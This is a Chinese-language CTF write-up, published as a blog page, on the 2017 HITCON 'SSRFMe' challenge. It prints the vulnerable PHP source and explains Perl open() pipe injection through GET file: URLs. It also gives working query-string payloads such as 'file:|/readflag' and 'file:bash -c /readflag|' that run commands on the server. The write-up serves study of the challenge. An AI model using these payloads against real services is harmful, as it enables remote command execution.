@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="baidu-site-verification" content="093lY4ziMu" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="description" content="blog">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <!--<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>-->
+    <title>
+        
+          2017HITCON-CTF-SSRFMe - CoCo1er&#39;s blog
+        
+    </title>
+
+    <link rel="canonical" href="http://yoursite.com/2019/09/25/2017HITCON-CTF-SSRFMe/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+
+    <!-- Custom CSS --> 
+    
+        
+<link rel="stylesheet" href="/css/dusign-light.css">
+
+        
+<link rel="stylesheet" href="/css/dusign-common-light.css">
+
+        
+<link rel="stylesheet" href="/css/font-awesome.css">
+
+        
+<link rel="stylesheet" href="/css/toc.css">
+
+        <!-- background effects end -->
+    
+    
+    <!-- Pygments Highlight CSS -->
+    
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+    
+<link rel="stylesheet" href="/css/widget.css">
+
+
+    
+<link rel="stylesheet" href="/css/rocket.css">
+
+
+    
+<link rel="stylesheet" href="/css/signature.css">
+
+
+    
+<link rel="stylesheet" href="/css/fonts.googleapis.css">
+
+
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+    <!-- photography -->
+    
+<link rel="stylesheet" href="/css/photography.css">
+
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- background effects start -->
+    
+    <!-- background effects end -->
+
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            
+                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('')
+                /*post*/
+            
+        
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#GET命令执行" title="GET命令执行">GET命令执行</a>
+                            
+                              <a class="tag" href="/tags/#SSRF" title="SSRF">SSRF</a>
+                            
+                        </div>
+                        <h1>2017HITCON-CTF-SSRFMe</h1>
+                        <h2 class="subheading"></h2>
+                        <span class="meta">
+                            Posted by CoCo1er on
+                            2019-09-25
+                        </span>
+
+                        
+                            <div class="blank_box"></div>
+                            <span class="meta">
+                                Words <span class="post-count">1k</span> and
+                                Reading Time <span class="post-count">4</span> Minutes
+                            </span>
+                            <div class="blank_box"></div>
+                            <!-- 不蒜子统计 start -->
+                            <span class="meta">
+                                Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
+                            </span>
+                            <!-- 不蒜子统计 end -->
+                        
+
+                    </div>
+                
+
+                </div>
+            </div>
+        </div>      
+    </div>
+
+    
+    <div class="waveWrapper">
+        <div class="wave wave_before" style="background-image: url('/img/wave-light.png')"></div>
+        <div class="wave wave_after" style="background-image: url('/img/wave-light.png')"></div>
+    </div>
+    
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">CoCo1er&#39;s blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/photography/">Photography</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/categories/">Categories</a>
+                        </li>
+                        
+                    
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="2017HITCON-CTF-SSRFMe"><a href="#2017HITCON-CTF-SSRFMe" class="headerlink" title="2017HITCON-CTF-SSRFMe"></a>2017HITCON-CTF-SSRFMe</h1><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>​        拿到题意直接给出了源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $sandbox = <span class="string">"sandbox/sandbox"</span>; </span><br><span class="line">    @mkdir($sandbox); </span><br><span class="line">    @chdir($sandbox); </span><br><span class="line"></span><br><span class="line">    $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($_GET[<span class="string">"url"</span>])); </span><br><span class="line">    $info = pathinfo($_GET[<span class="string">"filename"</span>]); </span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>])); </span><br><span class="line">    @mkdir($dir); </span><br><span class="line">    @chdir($dir); </span><br><span class="line">    @file_put_contents(basename($info[<span class="string">"basename"</span>]), $data); </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>审计分析源码过程大致如下：</p>
+<ul>
+<li>进入<code>./sandbox/sandbox</code>目录</li>
+<li>执行GET命令，GET的内容可控</li>
+<li>将内容写入<code>./sandbox/sandbox/filename</code></li>
+<li>最终直接访问<code>./sandbox/sandbox/filename</code>可以获取到GET执行获得的内容</li>
+</ul>
+<h2 id="GET初利用"><a href="#GET初利用" class="headerlink" title="GET初利用"></a>GET初利用</h2><p>​        首先利用SSRF我们可以传入<code>url=file:///&amp;filename=456</code>获得根目录的文件路径列表，访问<code>/sandbox/sandbox/456</code> 发现readflag和flag</p>
+<p><img src="2017HITCON-CTF-SSRFMe/1.png" alt=""></p>
+<p>​        可是当我们想读取flag和readflag的时候，发现flag无法直接读取出来，readflag读取并下载出来发现ELF文件头，是一个可执行文件，猜测需要执行readflag这个文件才能获得flag。（猜测这个文件本身有可执行权限）</p>
+<p>​        于是我们需要执行命令运行这个可执行文件。</p>
+<h2 id="GET执行任意命令"><a href="#GET执行任意命令" class="headerlink" title="GET执行任意命令"></a>GET执行任意命令</h2><p>​        这里利用的是比较早就被爆出来的一个问题。这里的原理涉及到代码的底层实现，不过多深究，来自LoRexxar师傅的文章：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@iZ285ei82c1Z:~&#x2F;test# cat a.pl </span><br><span class="line">open(FD, &quot;|id&quot;);</span><br><span class="line">print &lt;FD&gt;;</span><br><span class="line">root@iZ285ei82c1Z:~&#x2F;test# perl a.pl </span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure>
+<p>而perl里的GET函数底层就是调用了open处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file.pm</span><br><span class="line">84: opendir(D, $path) or</span><br><span class="line">132:    open(F, $path) or return new</span><br></pre></td></tr></table></figure>
+<p>open函数本身还支持file协议</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@iZ285ei82c1Z:~&#x2F;test# cat &#x2F;usr&#x2F;share&#x2F;perl5&#x2F;LWP.pm</span><br><span class="line">...</span><br><span class="line">&#x3D;head2 File Request</span><br><span class="line">The library supports GET and HEAD methods for file requests.  The</span><br><span class="line">&quot;If-Modified-Since&quot; header is supported.  All other headers are</span><br><span class="line">ignored.  The I&lt;host&gt; component of the file URL must be empty or set</span><br><span class="line">to &quot;localhost&quot;.  Any other I&lt;host&gt; value will be treated as an error.</span><br><span class="line">Directories are always converted to an HTML document.  For normal</span><br><span class="line">files, the &quot;Content-Type&quot; and &quot;Content-Encoding&quot; in the response are</span><br><span class="line">guessed based on the file suffix.</span><br><span class="line">Example:</span><br><span class="line">  $req &#x3D; HTTP::Request-&gt;new(GET &#x3D;&gt; &#39;file:&#x2F;etc&#x2F;passwd&#39;);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>综合看起来是把一个文件名拼接入命令导致的命令执行。</p>
+<p>（同理，我们对GET命令而言，通过传入命令文件名和命令来执行）</p>
+<p><strong>这里补充一点</strong></p>
+<p>​        perl在open中可以执行命令，格式有两种：</p>
+<blockquote>
+<p><code>open(FD, &quot;ls|&quot;)或open(FD, &quot;|ls&quot;)</code></p>
+</blockquote>
+<p><img src="2017HITCON-CTF-SSRFMe/2.png" alt=""></p>
+<p><strong>利用方式</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET file:ls|</span><br><span class="line">GET file:|ls</span><br><span class="line">&#x2F;&#x2F;需要当前目录下存在与命令同名文件</span><br></pre></td></tr></table></figure>
+<p><img src="2017HITCON-CTF-SSRFMe/3.png" alt=""></p>
+<p>这里我在kali虚拟机里测试了一下，发现只有 <code>file:|id</code>有效。但是参考网上wp，其中都是采用的 <code>file:id|</code>的方式</p>
+<p>于是我又在vps上测试了一下</p>
+<p><img src="2017HITCON-CTF-SSRFMe/4.png" alt=""></p>
+<p>可以发现在vps下两种方式都是可行的，这里可能跟perl版本有关，具体原因有点迷。那么我们对题目进行测试的话两种都试一下。</p>
+<h2 id="Linux-执行文件"><a href="#Linux-执行文件" class="headerlink" title="Linux 执行文件"></a>Linux 执行文件</h2><p>​        首先必须要知道，对于一个可执行文件（Linux下具有”x”属性的文件），我们要执行这个文件（换句话来说就好比运行Windows下的exe文件）。</p>
+<p>​        Linux下，如果文件是可执行文件，或者是脚本文件，只要有可执行权限就可以直接执行，操作命令如下：</p>
+<p><strong><code>./filename</code></strong></p>
+<p>在当前路径下对执行filename文件</p>
+<p><strong><code>绝对路径</code></strong></p>
+<p>直接给出可执行文件的绝对路径并回车</p>
+<p>回来看我们的题，我们现在需要做的是执行根目录下的readflag，并且把readflag的内容写入某个文件，最后我们再访问该文件即可得到readflag执行后得到的结果。</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p><code>?url=&amp;filename=|/readflag</code>   创建与命令同名文件</p>
+<p><code>?url=file:|/readflag&amp;filename=123</code>    执行命令</p>
+<p><code>/sandbox/sandbox/123</code>     访问执行结果</p>
+<p>同时也试了另外一种（管道符在右边），并没有读出结果。看了网上的大多数复现，发现都是采用的管道符在右边这种形式，并且是以<code>bash -c  {命令}</code>整体作为命令执行的</p>
+<p>来自网上提供的解：</p>
+<p><code>/?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</code> 创建相应的同名文件<br><code>/?url=file:bash -c /readflag|&amp;filename=123</code> 利用open的feature执行代码<br>最后直接访问<strong>/sandbox/sandbox/123</strong>就能得到flag</p>
+
+                
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2019/09/28/2018TWCTF—shrine/" data-toggle="tooltip" data-placement="top" title="2018TWCTF—shrine">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/2019/09/25/2019SUCTF-Pythonginx/" data-toggle="tooltip" data-placement="top" title="2019SUCTF-Pythonginx">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                <!-- tip start -->
+                
+
+                
+                <!-- tip end -->
+
+                <!-- Music start-->
+                
+                <!-- Music end -->
+
+                <!-- Sharing -->
+                
+                <div class="social-share"  data-wechat-qrcode-helper="" align="center"></div>
+                <!--  css & js -->
+                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+                <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+                
+                <!-- Sharing -->
+
+                <!-- gitment start -->
+                
+                <!-- gitment end -->
+
+                <!-- 来必力City版安装代码 -->
+                
+                <!-- City版安装代码已完成 -->
+
+                <!-- disqus comment start -->
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#GET命令执行" title="GET命令执行">GET命令执行</a>
+                        
+                          <a class="tag" href="/tags/#SSRF" title="SSRF">SSRF</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="https://blog.csdn.net/d_Nail" target="_blank">Dusign&#39;s Blog</a></li>
+                    
+                        <li><a href="#" target="_blank">Dusign&#39;s Web</a></li>
+                    
+                        <li><a href="https://github.com/dusign" target="_blank">Dusign&#39;s Github</a></li>
+                    
+                        <li><a href="#" target="_blank">Other</a></li>
+                    
+                </ul>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+
+
+<style  type="text/css">
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; CoCo1er 2020 
+                    <br>
+                    Powered by 
+                    <a href="https://github.com/dusign/hexo-theme-snail" target="_blank" rel="noopener">
+                        <i>hexo-theme-snail</i>
+                    </a> | 
+                    <iframe style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0"
+                        width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=dusign&repo=hexo-theme-snail&type=star&count=true">
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+
+</footer>
+
+<!-- jQuery -->
+
+<script src="/js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="/js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- Search -->
+
+<script src="/js/search.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://yoursite.com/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+<script>
+    // dynamic User by Hux
+    var _gaId = 'UA-XXXXXXXX-X';
+    var _gaDomain = 'yoursite';
+
+    // Originial
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', _gaId, _gaDomain);
+    ga('send', 'pageview');
+</script>
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- Search -->
+
+    <script type="text/javascript">      
+        var search_path = "search.xml";
+        if (search_path.length == 0) {
+            search_path = "search.xml";
+        }
+    var path = "/" + search_path;
+    searchFunc(path, 'local-search-input', 'local-search-result');
+    </script>
+
+
+<!-- busuanzi -->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+
+    
+        <!-- background effects line -->
+        
+
+        
+            <script type="text/javascript" src="/js/mouse-click.js" content='[&#34;🌱&#34;,&#34;just do it&#34;,&#34;🍀&#34;]' color='[&#34;rgb(121,93,179)&#34; ,&#34;rgb(76,180,231)&#34; ,&#34;rgb(184,90,154)&#34;]'></script>
+        
+
+        <!-- background effects end -->
+    
+
+    <!--<script size="50" alpha='0.3' zIndex="-999" src="/js/ribbonStatic.js"></script>-->
+    
+        <script src="/js/ribbonDynamic.js"></script>
+    
+</body>
+
+</html>
